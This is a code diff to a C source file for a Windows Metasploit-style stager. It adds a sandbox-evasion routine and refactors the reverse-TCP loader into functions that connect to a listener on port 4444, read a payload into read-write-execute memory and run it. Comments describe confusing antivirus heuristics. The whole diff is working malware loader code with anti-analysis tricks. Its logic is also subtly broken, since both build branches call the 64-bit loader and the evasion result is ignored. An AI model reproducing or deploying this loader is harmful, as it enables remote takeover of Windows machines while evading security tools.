@@ -2,7 +2,17 @@
 #include <stdlib.h>
 #include <windows.h>
 #include <winsock2.h>
-#include <string.h>
+
+//Function Headers
+void winsock_init();
+void Kick(SOCKET my_socket, char * error);
+void genlol();
+int recv_all(SOCKET my_socket, void * buffer, int len);
+SOCKET wsconnect(char * targetip, int port);
+int random_in_range (unsigned int min, unsigned int max);
+char* rev(char* str);
+int sandbox_evasion();
+inline void reverse_tcp_meterpreter(char * listenerIP,unsigned int listenerPort);
 
 void winsock_init() {
 	WSADATA	wsaData;
@@ -69,7 +79,9 @@ SOCKET wsconnect(char * targetip, int port) {
 int random_in_range (unsigned int min, unsigned int max)
 {
   int base_random = rand(); /* in [0, RAND_MAX] */
-  if (RAND_MAX == base_random) return random_in_range(min, max);
+  if (RAND_MAX == base_random){
+	  return random_in_range(min, max);
+  }
   /* now guaranteed to be in [0, RAND_MAX) */
   int range       = max - min,
       remainder   = RAND_MAX % range,
@@ -95,18 +107,8 @@ char* rev(char* str)
   return str;
 }
 
-
-int main(int argc) {
-	ULONG32 size;
-	char * buffer;
-	void (*function)();
-	winsock_init();
-	char argv[3][25];
-
-	//this program was meant to be run from the command line, so i added this so it would work
-	strcpy(argv[1],"ListenerIP");
-	strcpy(argv[2],"ListenerPort");
-
+//Evade the sandbox
+int sandbox_evasion(){
 	//================================
 	//begin sandbox evasssioooooon
 	MSG msg;
@@ -115,19 +117,29 @@ int main(int argc) {
 	//see this post for more info http://schierlm.users.sourceforge.net/avevasion.html
 	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
 	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
-		return 0;
+		return -1;
 	if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
-		return 0;
+		return -1;
 	//record the ticks, then sleep, then count the ticks.... this verifies that we actually slept for 650
 	//this helps burn out the clock on the sandboxing, or detect if sandboxing is converting sleeps to nops
 	tc = GetTickCount();
 	Sleep(650);
 	if (((GetTickCount() - tc) / 300) != 2)
-		return 0;
+		return -1;
 	//=================================
+	return 0;
+}
+
+
+//The metasploit-loader extracted into its own function.
+void reverse_tcp_meterpreter(char * listenerIP,unsigned int listenerPort){
+	ULONG32 size;
+	char * buffer;
+	void (*function)();
+	winsock_init();
 
 	//start the socket homie
-	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
+	SOCKET my_socket = wsconnect(listenerIP, listenerPort);
 	//receive 4 bytes which indicates the size of the next payload
 	int count = recv(my_socket, (char *)&size, 4, 0);
 	//check for issues
@@ -173,5 +185,87 @@ int main(int argc) {
 	function = (void (*)())buffer;
 	//execute dat meterpreter
 	function();
+}
+
+
+//The metasploit-loader for 64 bit systems
+void reverse_tcp_meterpreter_x64(char * listenerIP,unsigned int listenerPort){
+	ULONG32 size;
+	char * buffer;
+	void (*function)();
+	winsock_init();
+
+	//start the socket homie
+	SOCKET my_socket = wsconnect(listenerIP, listenerPort);
+	//receive 4 bytes which indicates the size of the next payload
+	int count = recv(my_socket, (char *)&size, 4, 0);
+	//check for issues
+	if (count != 4 || size <= 0)
+		Kick(my_socket, "bad length value\n");
+
+	//================================
+	//burn out the clock, and confuse heuristics with some random number generation
+	genlol();
+	//================================	
+
+	//allocate the RWX buffer
+	buffer = VirtualAlloc(0, size + 10, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	//================================
+	//burn out the clock, and confuse heuristics with some random number generation
+	genlol();
+	//================================
+
+	//check the buffer for issues
+	if (buffer == NULL)
+		Kick(my_socket, "bad buffer\n");
+	//puts mov on to the front of the buffer
+	buffer[0] = 0x48;
+	buffer[1] = 0xBF;
+
+	//================================
+	//burn out the clock, and confuse heuristics with some random number generation	
+	genlol();
+	//================================
+
+	//copies the socket pointer onto the buffer after 0x48 0xBF
+	//see this post for more infor http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
+	memcpy(buffer + 2, &my_socket, 8);
+
+	//================================
+	//burn out the clock, and confuse heuristics with some random number generation
+	genlol();
+	//================================
+
+	//receives the rest of the data from the socket (based on the size received before)
+	count = recv_all(my_socket, buffer + 10, size);
+	//cast the buffer as a function?
+	function = (void (*)())buffer;
+	//execute dat meterpreter
+	function();
+}
+
+int main(int argc, char *argv[]) {
+	//this program was meant to be run from the command line, so i added this so it would work
+	char * defaultListenerIP = "ListenerIP";
+	unsigned int defaultListenerPort = 4444;
+
+	sandbox_evasion();
+
+	//If command line parameters are given, use those instead of defaults.
+	if(argc == 3){
+		#ifdef ISX64
+			reverse_tcp_meterpreter_x64(argv[1], atoi(argv[2]));
+		#else
+			reverse_tcp_meterpreter_x64(argv[1], atoi(argv[2]));
+		#endif
+	}else{
+		#ifdef ISX64
+			reverse_tcp_meterpreter_x64(defaultListenerIP, defaultListenerPort);
+		#else
+			reverse_tcp_meterpreter_x64(defaultListenerIP, defaultListenerPort);
+		#endif
+	}
+
 	return 0;
 }
